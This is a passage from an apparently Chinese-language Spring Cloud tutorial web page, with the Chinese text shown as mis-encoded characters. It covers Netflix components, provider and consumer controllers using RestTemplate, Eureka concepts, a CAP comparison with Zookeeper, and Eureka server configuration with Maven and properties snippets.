<p>Spring Cloudå¹¶ä¸æ˜¯ä»0å¼€å§‹å¼€å‘ä¸€æ•´å¥—å¾®æœåŠ¡è§£å†³æ–¹æ¡ˆï¼Œè€Œæ˜¯é›†æˆå„ä¸ªå¼€æºè½¯ä»¶ï¼Œæ„æˆä¸€æ•´å¥—çš„å¾®æœåŠ¡è§£å†³æ–¹æ¡ˆï¼Œè¿™å…¶ä¸­æœ‰éå¸¸è‘—åçš„Netflixå…¬å¸çš„å¼€æºäº§å“ï¼›</p>
<p>Netflixå…¬å¸æˆç«‹äº1997å¹´ï¼Œæ˜¯ç›®å‰ç¾å›½æœ€å¤§çš„ç‰ˆæƒè§†é¢‘äº¤æ˜“ç½‘ç«™ï¼›</p>
<p>Netflixå…¬å¸åœ¨ä¸æ–­å‘å±•çš„è¿‡ç¨‹ä¸­ï¼Œä¹Ÿæˆä¸ºäº†ä¸€å®¶äº‘è®¡ç®—å…¬å¸ï¼Œå¹¶ç§¯æå‚ä¸å¼€æºé¡¹ç›®ï¼ŒNetflix OSSï¼ˆOpen Sourceï¼‰å°±æ˜¯ç”±Netflixå…¬å¸ä¸»æŒå¼€å‘çš„ä¸€å¥—ä»£ç æ¡†æ¶å’Œåº“ï¼Œgithubåœ°å€ï¼š<a href="https://github.com/Netflix%EF%BC%9B">https://github.com/Netflixï¼›</a></p>
<p>Spring Cloud æ‰€åŒ…å«çš„ä¼—å¤šç»„ä»¶ä¸­ï¼ŒSpring Cloud Netflixå°±æ˜¯å…¶ä¸­ä¸€ç»„ä¸å¯å¿½è§†çš„ç»„ä»¶ï¼Œç”±netflixå…¬å¸å¼€å‘ååˆå¹¶å…¥Spring Cloud å¤§å®¶åº­ï¼›</p>
<p>ç›®å‰Netflixå…¬å¸è´¡çŒ®çš„æ´»è·ƒé¡¹ç›®åŒ…æ‹¬ï¼š</p>
<p>spring-cloud-netflix-eureka</p>
<p>spring-cloud-netflix-hystrix</p>
<p>spring-cloud-netflix-stream</p>
<p>spring-cloud-netflix-archaius</p>
<p>spring-cloud-netflix-ribbon</p>
<p>spring-cloud-netflix-zuul</p>
<h2 id="2-3-Spring-Cloudå¼€å‘ç¯å¢ƒ"><a href="#2-3-Spring-Cloudå¼€å‘ç¯å¢ƒ" class="headerlink" title="2.3 Spring Cloudå¼€å‘ç¯å¢ƒ"></a>2.3 Spring Cloudå¼€å‘ç¯å¢ƒ</h2><p>SpringBoot 2.2.x</p>
<p>Spring Cloud Hoxton xxx</p>
<p>Maven 3.5.3</p>
<p>JDK 1.8.152</p>
<p>IntelliJ IDEA</p>
<h2 id="2-4-Spring-Cloudçš„æ•´ä½“æ¶æ„"><a href="#2-4-Spring-Cloudçš„æ•´ä½“æ¶æ„" class="headerlink" title="2.4 Spring Cloudçš„æ•´ä½“æ¶æ„"></a>2.4 Spring Cloudçš„æ•´ä½“æ¶æ„</h2><p>  <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134871.png" alt="image-20201216192902340">                             </p>
<p>Service Providerï¼š æš´éœ²æœåŠ¡çš„æœåŠ¡æä¾›æ–¹ã€‚</p>
<p>Service Consumerï¼šè°ƒç”¨è¿œç¨‹æœåŠ¡çš„æœåŠ¡æ¶ˆè´¹æ–¹ã€‚</p>
<p>EureKa Serverï¼š æœåŠ¡æ³¨å†Œä¸­å¿ƒå’ŒæœåŠ¡å‘ç°ä¸­å¿ƒã€‚</p>
<h1 id="ç¬¬ä¸‰ç« -Spring-Cloudå¿«é€Ÿå¼€å‘å…¥é—¨"><a href="#ç¬¬ä¸‰ç« -Spring-Cloudå¿«é€Ÿå¼€å‘å…¥é—¨" class="headerlink" title="ç¬¬ä¸‰ç«  Spring Cloudå¿«é€Ÿå¼€å‘å…¥é—¨"></a>ç¬¬ä¸‰ç«  Spring Cloudå¿«é€Ÿå¼€å‘å…¥é—¨</h1><h2 id="3-1-æ­å»ºå’Œé…ç½®ä¸€ä¸ªæœåŠ¡æä¾›è€…"><a href="#3-1-æ­å»ºå’Œé…ç½®ä¸€ä¸ªæœåŠ¡æä¾›è€…" class="headerlink" title="3.1 æ­å»ºå’Œé…ç½®ä¸€ä¸ªæœåŠ¡æä¾›è€…"></a>3.1 æ­å»ºå’Œé…ç½®ä¸€ä¸ªæœåŠ¡æä¾›è€…</h2><p>æˆ‘ä»¬çŸ¥é“ï¼ŒSpringCloudæ„å»ºå¾®æœåŠ¡æ˜¯åŸºäºSpringBootå¼€å‘çš„ã€‚</p>
<ol>
<li><p>åˆ›å»ºä¸€ä¸ªSpringBootå·¥ç¨‹ï¼ˆSpringBootçš„Webå·¥ç¨‹ï¼‰ï¼Œå¹¶ä¸”æ·»åŠ SpringBootçš„ç›¸å…³ä¾èµ–ï¼›</p>
</li>
<li><p>åˆ›å»ºæœåŠ¡æä¾›è€…çš„è®¿é—®æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯åç»­æ¶ˆè´¹è€…å¦‚ä½•è®¿é—®æä¾›è€…ï¼›</p>
<p>Spring Cloudæ˜¯åŸºäºrestçš„è®¿é—®ï¼Œæ‰€ä»¥æˆ‘ä»¬æ·»åŠ ä¸€ä¸ªControllerï¼Œåœ¨è¯¥Controllerä¸­æä¾›ä¸€ä¸ªè®¿é—®å…¥å£ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/hello&quot;, method = RequestMethod.GET)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello Spring Cloud&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


</li>
<li><p>å¯åŠ¨è¿è¡Œè¯¥SpringBootç¨‹åºï¼Œè®¿é—®è¯¥controllerï¼›</p>
</li>
</ol>
<h2 id="3-2-æ­å»ºå’Œé…ç½®ä¸€ä¸ªæœåŠ¡æ¶ˆè´¹è€…"><a href="#3-2-æ­å»ºå’Œé…ç½®ä¸€ä¸ªæœåŠ¡æ¶ˆè´¹è€…" class="headerlink" title="3.2 æ­å»ºå’Œé…ç½®ä¸€ä¸ªæœåŠ¡æ¶ˆè´¹è€…"></a>3.2 æ­å»ºå’Œé…ç½®ä¸€ä¸ªæœåŠ¡æ¶ˆè´¹è€…</h2><p>æœåŠ¡æ¶ˆè´¹è€…ä¹Ÿæ˜¯ä¸€ä¸ªSpringBooté¡¹ç›®ï¼ŒæœåŠ¡æ¶ˆè´¹è€…ä¸»è¦ç”¨æ¥æ¶ˆè´¹æœåŠ¡æä¾›è€…æä¾›çš„æœåŠ¡ï¼›</p>
<ol>
<li><p>åˆ›å»ºä¸€ä¸ªSpringBootå·¥ç¨‹ï¼ˆSpringBootçš„Webå·¥ç¨‹ï¼‰ï¼Œå¹¶ä¸”æ·»åŠ SpringBootçš„ç›¸å…³ä¾èµ–ï¼›</p>
</li>
<li><p>å®šä¹‰è‡ªå®šä¹‰ç±»RestTemplateConfigç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ ‡è®°å½“å‰ç±»æ˜¯ä¸€ä¸ªSpringé…ç½®ç±»ï¼Œç”¨äºæ¨¡æ‹ŸSpringçš„é…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestTemplateConfig</span> &#123;</span><br><span class="line"><span class="comment">//@Beanæ ‡è®°å½“å‰æ–¹æ³•æ˜¯ä¸€ä¸ªSpringé…ç½®æ–¹æ³•ï¼Œç”¨äºæ¨¡æ‹ŸSpringé…ç½®æ–‡ä»¶ä¸­çš„Beanæ ‡ç­¾</span></span><br><span class="line"><span class="comment">//å…¶ä¸­æ–¹æ³•çš„è¿”å›å€¼ç›¸å½“äºBeanæ ‡ç­¾çš„class</span></span><br><span class="line"><span class="comment">//å…¶ä¸­æ–¹æ³•çš„åå­—ç›¸å½“äºBeanæ ‡ç­¾çš„id</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
</li>
<li><p>å¼€å‘ä¸€ä¸ªæ¶ˆè´¹è€…æ–¹æ³•ï¼Œå»æ¶ˆè´¹æœåŠ¡æä¾›è€…æä¾›çš„æœåŠ¡ï¼Œè¿™ä¸ªæ¶ˆè´¹è€…æ–¹æ³•ä¹Ÿæ˜¯ä¸€ä¸ªController:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * SpringCloudçš„æ¶ˆè´¹è€…ç«¯ï¼Œæ¶ˆè´¹å°±æ˜¯ä¸€ä¸ªæ™®é€šçš„SpringBootçš„webå·¥ç¨‹</span></span><br><span class="line"><span class="comment"> * è¿™é‡Œéœ€è¦ä½¿ç”¨Httpåè®®è®¿é—®æœåŠ¡æä¾›è€…</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//è®¿é—®è¿œç¨‹çš„SpringCloudçš„æœåŠ¡</span></span><br><span class="line">        <span class="comment">//å‚æ•°1 ä¸ºæœåŠ¡å™¨çš„åœ°å€ä»¥åŠæœåŠ¡å™¨çš„è¯·æ±‚å</span></span><br><span class="line">        <span class="comment">//å‚æ•°2 ç”¨äºæŒ‡å®šè¿”å›çš„æ•°æ®ç±»å‹æ˜¯å­—ç¬¦æ ¼å¼</span></span><br><span class="line">        <span class="comment">//.getBody()æ–¹æ³•çš„ä½œç”¨æ˜¯è·å–å“åº”çš„ä¸»ä½“å†…å®¹ï¼ˆæœåŠ¡ç«¯è¿”å›çš„å…·ä½“JSONæ•°æ®ï¼‰</span></span><br><span class="line">        <span class="keyword">return</span> restTemplate.getForEntity(<span class="string">&quot;http://localhost:8081/test&quot;</span>,String.class).getBody()+<span class="string">&quot;  -----SpringCloudçš„æ¶ˆè´¹è€…&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>å¯åŠ¨è¯¥SpringBootç¨‹åºï¼Œæµ‹è¯•æœåŠ¡æ¶ˆè´¹è€…è°ƒç”¨æœåŠ¡æä¾›è€…</p>
</li>
</ol>
<h2 id="3-3-èµ°è¿›æœåŠ¡æ³¨å†Œä¸­å¿ƒEureka"><a href="#3-3-èµ°è¿›æœåŠ¡æ³¨å†Œä¸­å¿ƒEureka" class="headerlink" title="3.3 èµ°è¿›æœåŠ¡æ³¨å†Œä¸­å¿ƒEureka"></a>3.3 èµ°è¿›æœåŠ¡æ³¨å†Œä¸­å¿ƒEureka</h2><p>åœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼ŒæœåŠ¡æ³¨å†Œä¸å‘ç°æ˜¯æ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ï¼Œæ‰‹åŠ¨æŒ‡å®šæ¯ä¸ªæœåŠ¡æ˜¯å¾ˆä½æ•ˆçš„ï¼ŒSpring Cloudæä¾›äº†å¤šç§æœåŠ¡æ³¨å†Œä¸å‘ç°çš„å®ç°æ–¹å¼ï¼Œä¾‹å¦‚ï¼šEurekaã€Consulã€Zookeeperã€‚</p>
<p>Spring Cloudæ”¯æŒå¾—æœ€å¥½çš„æ˜¯Eurekaï¼Œå…¶æ¬¡æ˜¯Consulï¼Œå†æ¬¡æ˜¯Zookeeperã€‚</p>
<p><strong>ä»€ä¹ˆæ˜¯æœåŠ¡æ³¨å†Œï¼Ÿ</strong></p>
<p>æœåŠ¡æ³¨å†Œï¼šå°†æœåŠ¡æ‰€åœ¨ä¸»æœºã€ç«¯å£ã€ç‰ˆæœ¬å·ã€é€šä¿¡åè®®ç­‰ä¿¡æ¯ç™»è®°åˆ°æ³¨å†Œä¸­å¿ƒä¸Šï¼›</p>
<p><strong>ä»€ä¹ˆæ˜¯æœåŠ¡å‘ç°ï¼Ÿ</strong></p>
<p>æœåŠ¡å‘ç°ï¼šæœåŠ¡æ¶ˆè´¹è€…å‘æ³¨å†Œä¸­å¿ƒè¯·æ±‚å·²ç»ç™»è®°çš„æœåŠ¡åˆ—è¡¨ï¼Œç„¶åå¾—åˆ°æŸä¸ªæœåŠ¡çš„ä¸»æœºã€ç«¯å£ã€ç‰ˆæœ¬å·ã€é€šä¿¡åè®®ç­‰ä¿¡æ¯ï¼Œä»è€Œå®ç°å¯¹å…·ä½“æœåŠ¡çš„è°ƒç”¨ï¼›</p>
<p><strong>Eurekaæ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<p>Eurekaæ˜¯ä¸€ä¸ªæœåŠ¡æ²»ç†ç»„ä»¶ï¼Œå®ƒä¸»è¦åŒ…æ‹¬æœåŠ¡æ³¨å†Œå’ŒæœåŠ¡å‘ç°ï¼Œä¸»è¦ç”¨æ¥æ­å»ºæœåŠ¡æ³¨å†Œä¸­å¿ƒã€‚</p>
<p>Eureka æ˜¯ä¸€ä¸ªåŸºäº REST çš„æœåŠ¡ï¼Œç”¨æ¥å®šä½æœåŠ¡ï¼Œè¿›è¡Œä¸­é—´å±‚æœåŠ¡å™¨çš„è´Ÿè½½å‡è¡¡å’Œæ•…éšœè½¬ç§»ï¼›</p>
<p>Eurekaæ˜¯Netflix å…¬å¸å¼€å‘çš„ï¼ŒSpring Cloud å°è£…äº† Netflix å…¬å¸å¼€å‘çš„ Eureka æ¨¡å—æ¥å®ç°æœåŠ¡æ³¨å†Œå’Œå‘ç°ï¼Œä¹Ÿå°±æ˜¯è¯´Spring Cloudå¯¹Netflix Eureka åšäº†äºŒæ¬¡å°è£…ï¼›</p>
<p>Eureka é‡‡ç”¨äº†C-Sï¼ˆå®¢æˆ·ç«¯&#x2F;æœåŠ¡ç«¯ï¼‰çš„è®¾è®¡æ¶æ„ï¼Œä¹Ÿå°±æ˜¯Eurekaç”±ä¸¤ä¸ªç»„ä»¶ç»„æˆï¼šEurekaæœåŠ¡ç«¯å’ŒEurekaå®¢æˆ·ç«¯ã€‚Eureka Server ä½œä¸ºæœåŠ¡æ³¨å†Œçš„æœåŠ¡ç«¯ï¼Œå®ƒæ˜¯æœåŠ¡æ³¨å†Œä¸­å¿ƒï¼Œè€Œç³»ç»Ÿä¸­çš„å…¶ä»–å¾®æœåŠ¡ï¼Œä½¿ç”¨ Eureka çš„å®¢æˆ·ç«¯è¿æ¥åˆ° Eureka ServeræœåŠ¡ç«¯ï¼Œå¹¶ç»´æŒå¿ƒè·³è¿æ¥ï¼ŒEurekaå®¢æˆ·ç«¯æ˜¯ä¸€ä¸ªJavaå®¢æˆ·ç«¯ï¼Œç”¨æ¥ç®€åŒ–ä¸æœåŠ¡å™¨çš„äº¤äº’ã€è´Ÿè½½å‡è¡¡ï¼ŒæœåŠ¡çš„æ•…éšœåˆ‡æ¢ç­‰ï¼›</p>
<p>æœ‰äº†Eurekaæ³¨å†Œä¸­å¿ƒï¼Œç³»ç»Ÿçš„ç»´æŠ¤äººå‘˜å°±å¯ä»¥é€šè¿‡ Eureka Server æ¥ç›‘æ§ç³»ç»Ÿä¸­å„ä¸ªå¾®æœåŠ¡æ˜¯å¦æ­£å¸¸è¿è¡Œã€‚</p>
<h2 id="3-4-Eurekaä¸Zookeeperçš„æ¯”è¾ƒ"><a href="#3-4-Eurekaä¸Zookeeperçš„æ¯”è¾ƒ" class="headerlink" title="3.4 Eurekaä¸Zookeeperçš„æ¯”è¾ƒ"></a>3.4 Eurekaä¸Zookeeperçš„æ¯”è¾ƒ</h2><p>è‘—åçš„CAPç†è®ºæŒ‡å‡ºï¼Œä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿä¸å¯èƒ½åŒæ—¶æ»¡è¶³Consistency(ä¸€è‡´æ€§)ã€Availability(å¯ç”¨æ€§)å’ŒPartition tolerance(åˆ†åŒºå®¹é”™æ€§)ã€‚</p>
<p>ç”±äºåˆ†åŒºå®¹é”™æ€§åœ¨æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å¿…é¡»è¦ä¿è¯çš„ï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½åœ¨Aå’ŒCä¹‹é—´è¿›è¡Œæƒè¡¡ï¼Œåœ¨æ­¤Zookeeperä¿è¯çš„æ˜¯CP, è€ŒEurekaåˆ™æ˜¯APã€‚</p>
<p><strong>Zookeeperä¿è¯CP</strong></p>
<p>åœ¨ZooKeeperä¸­ï¼Œå½“masterèŠ‚ç‚¹å› ä¸ºç½‘ç»œæ•…éšœä¸å…¶ä»–èŠ‚ç‚¹å¤±å»è”ç³»æ—¶ï¼Œå‰©ä½™èŠ‚ç‚¹ä¼šé‡æ–°è¿›è¡Œleaderé€‰ä¸¾ï¼Œä½†æ˜¯é—®é¢˜åœ¨äºï¼Œé€‰ä¸¾leaderéœ€è¦ä¸€å®šæ—¶é—´, ä¸”é€‰ä¸¾æœŸé—´æ•´ä¸ªZooKeeperé›†ç¾¤éƒ½æ˜¯ä¸å¯ç”¨çš„ï¼Œè¿™å°±å¯¼è‡´åœ¨é€‰ä¸¾æœŸé—´æ³¨å†ŒæœåŠ¡ç˜«ç—ªã€‚åœ¨äº‘éƒ¨ç½²çš„ç¯å¢ƒä¸‹ï¼Œå› ç½‘ç»œé—®é¢˜ä½¿å¾—ZooKeeperé›†ç¾¤å¤±å»masterèŠ‚ç‚¹æ˜¯å¤§æ¦‚ç‡äº‹ä»¶ï¼Œè™½ç„¶æœåŠ¡æœ€ç»ˆèƒ½å¤Ÿæ¢å¤ï¼Œä½†æ˜¯åœ¨é€‰ä¸¾æ—¶é—´å†…å¯¼è‡´æœåŠ¡æ³¨å†Œé•¿æœŸä¸å¯ç”¨æ˜¯éš¾ä»¥å®¹å¿çš„ã€‚</p>
<p><strong>Eurekaä¿è¯AP</strong></p>
<p>Eurekaä¼˜å…ˆä¿è¯å¯ç”¨æ€§ï¼ŒEurekaå„ä¸ªèŠ‚ç‚¹æ˜¯å¹³ç­‰çš„ï¼ŒæŸå‡ ä¸ªèŠ‚ç‚¹æŒ‚æ‰ä¸ä¼šå½±å“æ­£å¸¸èŠ‚ç‚¹çš„å·¥ä½œï¼Œå‰©ä½™çš„èŠ‚ç‚¹ä¾ç„¶å¯ä»¥æä¾›æ³¨å†Œå’ŒæŸ¥è¯¢æœåŠ¡ã€‚è€ŒEurekaçš„å®¢æˆ·ç«¯åœ¨å‘æŸä¸ªEurekaæ³¨å†Œæˆ–æ—¶å¦‚æœå‘ç°è¿æ¥å¤±è´¥ï¼Œåˆ™ä¼šè‡ªåŠ¨åˆ‡æ¢è‡³å…¶å®ƒèŠ‚ç‚¹ï¼Œåªè¦æœ‰ä¸€å°Eurekaè¿˜åœ¨ï¼Œå°±èƒ½ä¿è¯æ³¨å†ŒæœåŠ¡å¯ç”¨(ä¿è¯å¯ç”¨æ€§)ï¼Œåªä¸è¿‡æŸ¥åˆ°çš„ä¿¡æ¯å¯èƒ½ä¸æ˜¯æœ€æ–°çš„(ä¸ä¿è¯å¼ºä¸€è‡´æ€§)ã€‚</p>
<p>æ‰€ä»¥Eurekaåœ¨ç½‘ç»œæ•…éšœå¯¼è‡´éƒ¨åˆ†èŠ‚ç‚¹å¤±å»è”ç³»çš„æƒ…å†µä¸‹ï¼Œåªè¦æœ‰ä¸€ä¸ªèŠ‚ç‚¹å¯ç”¨ï¼Œé‚£ä¹ˆæ³¨å†Œå’ŒæŸ¥è¯¢æœåŠ¡å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼Œè€Œä¸ä¼šåƒzookeeperé‚£æ ·ä½¿æ•´ä¸ªæ³¨å†ŒæœåŠ¡ç˜«ç—ªï¼ŒEurekaä¼˜å…ˆä¿è¯äº†å¯ç”¨æ€§ã€‚</p>
<h2 id="3-5-æ­å»ºä¸é…ç½®EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒ"><a href="#3-5-æ­å»ºä¸é…ç½®EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒ" class="headerlink" title="3.5 æ­å»ºä¸é…ç½®EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒ"></a>3.5 æ­å»ºä¸é…ç½®EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒ</h2><p>Spring Cloudè¦ä½¿ç”¨Eurekaæ³¨å†Œä¸­å¿ƒéå¸¸ç®€å•å’Œæ–¹ä¾¿ï¼ŒSpring Cloudä¸­çš„EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒå®é™…ä¸Šä¹Ÿæ˜¯ä¸€ä¸ªSpring Bootå·¥ç¨‹ï¼Œæˆ‘ä»¬åªéœ€é€šè¿‡å¼•å…¥ç›¸å…³ä¾èµ–å’Œæ³¨è§£é…ç½®å°±èƒ½è®©Spring Bootæ„å»ºçš„å¾®æœåŠ¡åº”ç”¨è½»æ¾åœ°ä¸Eurekaè¿›è¡Œæ•´åˆã€‚</p>
<p>å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li><p>åˆ›å»ºä¸€ä¸ªSpringBooté¡¹ç›®02-springcloud-eureka-serverï¼Œå¹¶ä¸”æ·»åŠ SpringBootçš„ç›¸å…³ä¾èµ–ï¼›</p>
</li>
<li><p>æ·»åŠ eurekaçš„ä¾èµ–ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;!--Spring Cloudçš„eureka-serverèµ·æ­¥ä¾èµ–--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


</li>
<li><p>å¿…é¡»æ·»åŠ Mavençš„ä¾èµ–ç®¡ç†å™¨ï¼Œå¦åˆ™eurekaæ— æ³•è¢«è¯†åˆ«</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencyManagement&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt;</span><br><span class="line">            &lt;type&gt;pom&lt;/type&gt;</span><br><span class="line">            &lt;scope&gt;<span class="keyword">import</span>&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">&lt;/dependencyManagement&gt;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼šå¦‚æœé€šè¿‡SpringBootçš„å¼€å‘å·¥å…·åˆ›å»ºWebå·¥ç¨‹é‚£ä¹ˆè¿™ä¸ªä¾èµ–ä»¥åŠä¾èµ–ç®¡ç†æ˜¯è‡ªåŠ¨æ·»åŠ  çš„</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134873.png" alt="image-20201216203512922"></p>
</li>
<li><p>åœ¨application.propertiesæ–‡ä»¶ä¸­é…ç½®EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒä¿¡æ¯ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#å†…åµŒå®šæ—¶tomcatçš„ç«¯å£</span><br><span class="line">server.port=<span class="number">9100</span></span><br><span class="line">#è®¾ç½®è¯¥æœåŠ¡æ³¨å†Œä¸­å¿ƒçš„hostname</span><br><span class="line">eureka.instance.hostname=localhost</span><br><span class="line">#ç”±äºæˆ‘ä»¬ç›®å‰åˆ›å»ºçš„åº”ç”¨æ˜¯ä¸€ä¸ªæœåŠ¡æ³¨å†Œä¸­å¿ƒï¼Œè€Œä¸æ˜¯æ™®é€šçš„åº”ç”¨ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªåº”ç”¨ä¼šå‘æ³¨å†Œä¸­å¿ƒï¼ˆä¹Ÿæ˜¯å®ƒè‡ªå·±ï¼‰æ³¨å†Œå®ƒè‡ªå·±ï¼Œè®¾ç½®ä¸º<span class="literal">false</span>è¡¨ç¤ºç¦æ­¢è¿™ç§è‡ªå·±å‘è‡ªå·±æ³¨å†Œçš„é»˜è®¤è¡Œä¸º</span><br><span class="line">eureka.client.register-with-eureka=<span class="literal">false</span></span><br><span class="line">#è¡¨ç¤ºä¸å»æ£€ç´¢å…¶ä»–çš„æœåŠ¡ï¼Œå› ä¸ºæœåŠ¡æ³¨å†Œä¸­å¿ƒæœ¬èº«çš„èŒè´£å°±æ˜¯ç»´æŠ¤æœåŠ¡å®ä¾‹ï¼Œå®ƒä¸éœ€è¦å»æ£€ç´¢å…¶ä»–æœåŠ¡</span><br><span class="line">eureka.client.fetch-registry=<span class="literal">false</span></span><br><span class="line">#æŒ‡å®šæœåŠ¡æ³¨å†Œä¸­å¿ƒçš„ä½ç½®</span><br><span class="line">eureka.client.service-url.defaultZone=http:<span class="comment">//$&#123;eureka.instance.hostname&#125;:$&#123;server.port&#125;/eureka</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>åœ¨Spring Bootçš„å…¥å£ç±»ä¸Šæ·»åŠ ä¸€ä¸ª@EnableEurekaServeræ³¨è§£ï¼Œç”¨äºå¼€å¯Eurekaæ³¨å†Œä¸­å¿ƒæœåŠ¡ç«¯</p>
</li>
</ol>
<h2 id="3-6-å¯åŠ¨ä¸æµ‹è¯•EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒ"><a href="#3-6-å¯åŠ¨ä¸æµ‹è¯•EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒ" class="headerlink" title="3.6 å¯åŠ¨ä¸æµ‹è¯•EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒ"></a>3.6 å¯åŠ¨ä¸æµ‹è¯•EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒ</h2><ol>
<li><p>å®Œæˆä¸Šé¢çš„é¡¹ç›®æ­å»ºåï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯åŠ¨SpringBootç¨‹åºï¼Œmainæ–¹æ³•è¿è¡Œï¼›</p>
</li>
<li><p>å¯åŠ¨æˆåŠŸä¹‹åï¼Œé€šè¿‡åœ¨æµè§ˆå™¨åœ°å€æ è®¿é—®æˆ‘ä»¬çš„æ³¨å†Œä¸­å¿ƒï¼›æµè§ˆå™¨è¾“å…¥<a href="http://localhost:9100/">http://localhost:9100</a> æ¥æµ‹è¯•Eurekaæ˜¯å¦å¯åŠ¨</p>
</li>
</ol>
<h2 id="3-7-å‘EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒæ³¨å†ŒæœåŠ¡"><a href="#3-7-å‘EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒæ³¨å†ŒæœåŠ¡" class="headerlink" title="3.7 å‘EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒæ³¨å†ŒæœåŠ¡"></a>3.7 å‘EurekaæœåŠ¡æ³¨å†Œä¸­å¿ƒæ³¨å†ŒæœåŠ¡</h2><p>æˆ‘ä»¬å‰é¢æ­å»ºäº†æœåŠ¡æä¾›è€…é¡¹ç›®ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥å°†è¯¥æœåŠ¡æä¾›è€…æ³¨å†Œåˆ°Eurekeæ³¨å†Œä¸­å¿ƒï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li>åœ¨è¯¥æœåŠ¡æä¾›è€…ä¸­æ·»åŠ eurekaçš„ä¾èµ–ï¼Œå› ä¸ºæœåŠ¡æä¾›è€…å‘æ³¨å†Œä¸­å¿ƒæ³¨å†ŒæœåŠ¡ï¼Œéœ€è¦è¿æ¥eurekaï¼Œæ‰€ä»¥éœ€è¦eurekaå®¢æˆ·ç«¯çš„æ”¯æŒï¼›</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;!--SpringCloudé›†æˆeurekaå®¢æˆ·ç«¯çš„èµ·æ­¥ä¾èµ–--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>å¿…é¡»æ·»åŠ Mavençš„ä¾èµ–ç®¡ç†å™¨ï¼Œå¦åˆ™eurekaæ— æ³•è¢«è¯†åˆ«</li>
</ol>
